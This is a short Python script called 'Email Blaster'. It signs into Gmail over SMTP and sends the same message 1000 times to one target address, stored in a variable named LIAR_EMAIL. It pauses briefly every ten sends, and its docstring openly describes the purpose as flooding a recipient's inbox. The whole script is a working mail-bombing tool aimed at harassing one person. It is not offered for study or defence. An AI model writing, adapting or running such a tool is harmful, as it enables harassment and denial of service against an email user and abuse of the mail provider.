#!/Library/Frameworks/Python.framework/Versions/3.6/bin/python3
import time
import smtplib

""" Email Blaster is a small but effective program that allows the
user to flood a recepient's inbox with a particular message.

BE WARNED, GOOGLE IS WATCHING, AND THEY WILL SHUT YOU DOWN IF YOU ABUSE
THEIR PLATFORM.
"""


SMTP_OBJ = smtplib.SMTP('smtp.gmail.com', 587)
LIAR_EMAIL = ''
EMAIL_SENDER = ""
EMAIL_SENDER_PSWD = ""
SUBJECT = ""
BODY = ""
MESSAGE = "Subject: {}.\n{}".format(SUBJECT, BODY)
EMAIL_NUM = 1000


def sign_in():
    SMTP_OBJ.starttls()
    SMTP_OBJ.login(EMAIL_SENDER, EMAIL_SENDER_PSWD)


def send_bad_mail():
    SMTP_OBJ.sendmail(
        EMAIL_SENDER, LIAR_EMAIL, MESSAGE
    )


def sign_off():
    SMTP_OBJ.quit()


def main():
    sign_in()
    for num in range(1, EMAIL_NUM+1):
        send_bad_mail()
        if num % 10 == 0:
            print("{} Emails Sent".format(num))
            time.sleep(5)

    sign_off()


if __name__ == "__main__":
    main()
